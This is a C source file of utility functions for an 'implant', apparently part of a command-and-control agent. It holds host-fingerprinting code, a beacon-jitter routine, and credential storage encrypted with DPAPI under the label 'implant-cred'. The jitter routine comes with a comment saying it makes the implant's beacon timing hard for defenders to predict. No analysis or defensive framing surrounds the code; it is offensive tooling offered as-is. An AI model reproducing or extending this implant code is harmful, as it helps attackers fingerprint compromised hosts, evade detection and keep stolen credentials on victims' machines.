#include "implant_utils.h"
#include "platform.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *operating_system_info(void)
{
    char *os_info = malloc(512);
    if (!os_info) return NULL;

#ifdef _WIN32
    OSVERSIONINFO version;
    version.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&version);

    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD hostname_len = sizeof(hostname);
    GetComputerNameA(hostname, &hostname_len);

    snprintf(os_info, 512, "Windows %lu.%lu | %s",
             version.dwMajorVersion,
             version.dwMinorVersion,
             hostname);

#elif __linux__ || __APPLE__
#include <sys/utsname.h>
    struct utsname info;
    uname(&info);
    snprintf(os_info, 512, "%s | %s | %s | %s",
             info.sysname,
             info.nodename,
             info.release,
             info.machine);
#else
    snprintf(os_info, 512, "Unknown OS");
#endif

    return os_info;
}

/*
 * BP3 — secure_jitter_sec
 *
 * Draws a 32-bit value from the OS entropy pool (BCryptGenRandom on Windows,
 * /dev/urandom on Linux) and maps it to [base - range, base + range].
 *
 * This replaces the original srand(time(NULL) ^ getpid()) / rand() scheme
 * whose seed space is small enough that an attacker who knows the approximate
 * implant start time can predict the entire jitter sequence and reconstruct
 * the beacon timing pattern, defeating the purpose of jitter entirely.
 */
int secure_jitter_sec(int base_sec, int range_sec)
{
    unsigned int r = 0;
    secure_random(&r, sizeof(r));

    int spread = range_sec * 2 + 1;          /* [0, spread) */
    int offset  = (int)(r % (unsigned int)spread) - range_sec;
    int result  = base_sec + offset;
    return result < 1 ? 1 : result;          /* floor at 1 second */
}

char *read_file_heap_plain(const char *path, int *len_out)
{
    FILE *fp = fopen(path, "rb");
    if (!fp) return NULL;
    fseek(fp, 0, SEEK_END);
    long sz = ftell(fp);
    rewind(fp);
    if (sz <= 0) { fclose(fp); return NULL; }
    char *buf = malloc((size_t)sz);
    if (!buf)  { fclose(fp); return NULL; }
    if ((long)fread(buf, 1, (size_t)sz, fp) != sz)
        { fclose(fp); free(buf); return NULL; }
    fclose(fp);
    *len_out = (int)sz;
    return buf;
}

char *read_file_heap(const char *path, int *len_out)
{
    FILE *fp = fopen(path, "rb");
    if (!fp) return NULL;
    fseek(fp, 0, SEEK_END);
    long sz = ftell(fp);
    rewind(fp);
    if (sz <= 0) { fclose(fp); return NULL; }
    unsigned char *buf = malloc((size_t)sz);
    if (!buf)  { fclose(fp); return NULL; }
    if ((long)fread(buf, 1, (size_t)sz, fp) != sz)
        { fclose(fp); free(buf); return NULL; }
    fclose(fp);

#ifdef _WIN32
    DATA_BLOB bin, out;
    bin.pbData = buf;
    bin.cbData = (DWORD)sz;
    if (CryptUnprotectData(&bin, NULL, NULL, NULL, NULL, 0, &out)) {
        free(buf);
        *len_out = (int)out.cbData;
        return (char *)out.pbData;
    }
    free(buf);
    return NULL;
#else
    *len_out = (int)sz;
    return (char *)buf;
#endif
}

void write_file_safe(const char *path, const char *data, int len)
{
#ifdef _WIN32
    /* Ensure parent directory exists */
    char dir[512];
    strncpy(dir, path, sizeof(dir) - 1);
    dir[sizeof(dir) - 1] = '\0';
    char *sep = strrchr(dir, '\\');
    if (sep) { *sep = '\0'; CreateDirectoryA(dir, NULL); }

    DATA_BLOB bin, out;
    bin.pbData = (BYTE *)data;
    bin.cbData = (DWORD)len;
    if (!CryptProtectData(&bin, L"implant-cred", NULL, NULL, NULL, 0, &out))
        return;
    data = (const char *)out.pbData;
    len  = (int)out.cbData;
#endif

    FILE *fp = fopen(path, "wb");
    if (fp) {
        fwrite(data, 1, (size_t)len, fp);
        fclose(fp);
    }

#ifdef _WIN32
    LocalFree((HLOCAL)out.pbData);
#endif
}
